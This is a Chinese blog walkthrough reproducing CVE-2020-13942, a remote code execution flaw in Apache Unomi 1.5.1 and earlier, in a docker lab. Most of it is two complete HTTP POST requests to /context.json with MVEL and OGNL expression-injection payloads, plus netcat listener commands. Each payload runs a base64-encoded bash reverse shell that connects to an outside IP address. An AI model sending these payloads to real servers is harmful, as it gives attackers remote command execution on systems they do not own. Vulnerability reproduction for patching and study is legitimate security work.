# Apache Unomi 远程表达式代码执行漏洞（CVE-2020-13942） - NoCirc1e - 博客园

> 原文：[`www.cnblogs.com/NoCirc1e/p/16275604.html`](https://www.cnblogs.com/NoCirc1e/p/16275604.html)

Apache Unomi 是一个基于标准的客户数据平台（CDP，Customer Data Platform），用于管理在线客户和访客等信息，以提供符合访客隐私规则的个性化体验。在 Apache Unomi 1.5.1 级以前版本中，存在一处表达式注入漏洞，远程攻击者通过 MVEL 和 OGNL 表达式即可在目标服务器上执行任意命令。

参考链接：

*   [`www.checkmarx.com/blog/apache-unomi-cve-2020-13942-rce-vulnerabilities-discovered/`](https://www.checkmarx.com/blog/apache-unomi-cve-2020-13942-rce-vulnerabilities-discovered/)
*   [`github.com/eugenebmx/CVE-2020-13942`](https://github.com/eugenebmx/CVE-2020-13942)

## 环境搭建

运行如下命令启动一个 Apache Unomi 1.5.1 的服务器：

```
docker-compose up -d
```

![](img/7633fdd574f467b929681534c142f09e.png)

环境启动后，通过`https://your-ip:9443`即可访问到 Unomi 的 API。

![](img/d202c4f7f4ad38af7316f340eb9b5315.png)

## 漏洞复现

通过 8181 和 9443 两个端口均可触发漏洞，以下以 8181 为例。

开启监听

```
nc -lvvp 9999
```

通过 MVEL 表达式执行任意命令：

```
POST /context.json HTTP/1.1
Host: localhost:8181
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 569 `{

"filters": [

{

"id": "sample",

"filters": [

{

"condition": {

"parameterValues": {

"": "script::Runtime r = Runtime.getRuntime(); r.exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc1LjE1MC85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}");"

},

"type": "profilePropertyCondition"

}

}

]

}

],

"sessionId": "sample"

}`
```

反弹 Shell 成功

![](img/b10c920d4fd6927b4e7b35a8d592869e.png)

开启监听

```
nv -lvvp 9998
```

通过 OGNL 表达式执行任意命令：

```
POST /context.json HTTP/1.1
Host: localhost:8181
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 1142 `{

"personalizations":[

{

"id":"gender-test",

"strategy":"matching-first",

"strategyOptions":{

"fallback":"var2"

},

"contents":[

{

"filters":[

{

"condition":{

"parameterValues":{

"propertyName":"(#runtimeclass = #this.getClass().forName("java.lang.Runtime")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals("getRuntime")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals("exec")}.{? #this.getParameters()[0].getType().getName().equals("java.lang.String")}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc1LjE1MC85OTk4IDA+JjE=}|{base64,-d}|{bash,-i}"))",

"comparisonOperator":"equals",

"propertyValue":"male"

},

"type":"profilePropertyCondition"

}

}

]

}

]

}

],

"sessionId":"sample"

}`
```

反弹 Shell 成功

![](img/6ae5b2eb23576fb56e923026f318b62a.png)